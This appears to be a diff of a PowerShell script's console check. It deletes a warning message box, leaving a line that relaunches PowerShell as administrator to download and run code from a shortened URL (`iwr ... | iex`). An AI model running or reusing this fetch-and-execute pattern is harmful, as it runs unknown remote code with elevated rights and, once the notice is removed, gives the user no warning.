@@ -2,20 +2,6 @@
 # Powershell Console Check #
 ############################
 if ($host.Name -ne "ConsoleHost") {
-    # Create a new Form object to act as the parent window
-    Add-Type -AssemblyName System.Windows.Forms
-    $form = New-Object System.Windows.Forms.Form
-    $form.TopMost = $true  # Ensure the MessageBox is on top
-
-    # Show the MessageBox with the form as its owner
-    [System.Windows.Forms.MessageBox]::Show(
-        $form,
-        "This script is not being executed in the PowerShell Console. A new PowerShell Console window will now open to ensure proper execution.",
-        "Execution Environment Notice",
-        [System.Windows.Forms.MessageBoxButtons]::OK,
-        [System.Windows.Forms.MessageBoxIcon]::Warning
-    )
-
     Start-Process PowerShell -ArgumentList "-Command ""iwr 'https://shorturl.at/nQ7Q8' | iex""" -Verb RunAs
     Exit
 }
